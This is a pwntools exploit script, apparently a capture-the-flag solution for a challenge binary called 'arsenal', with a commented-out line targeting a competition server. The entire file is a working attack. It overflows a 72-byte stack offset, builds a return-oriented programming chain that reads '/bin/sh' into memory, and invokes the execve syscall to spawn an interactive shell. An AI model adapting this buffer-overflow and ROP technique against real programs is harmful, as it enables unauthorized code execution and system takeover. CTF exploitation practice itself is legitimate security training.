from pwn import *

context.binary=elf=ELF("./arsenal")


p=process(elf.path)
#p=remote("offsec.m0lecon.it",13504)
pop_rdi=elf.sym.pop_rdi_ret
pop_rsi=elf.sym.pop_rsi_ret
pop_rdx=elf.sym.pop_rdx_ret
pop_rax=elf.sym.pop_rax_ret
armory=elf.sym.armory
syscall=elf.sym.syscall_ret
ret=ROP(elf).find_gadget(['ret'])[0]

offset=64+8

print(p.recv())

payload=flat(
    b'a'*(offset),
    p64(ret),
    #read
    p64(pop_rdi),p64(0),
    p64(pop_rsi),p64(armory),
    p64(pop_rdx),p64(8),
    p64(elf.sym.read),
    
    p64(pop_rax),p64(59),
    p64(pop_rdi),p64(armory),
    p64(pop_rsi),p64(0),
    p64(pop_rdx),p64(0),
    p64(syscall)
    


)

p.sendline(payload)

p.send(b"/bin/sh\x00")



p.interactive()
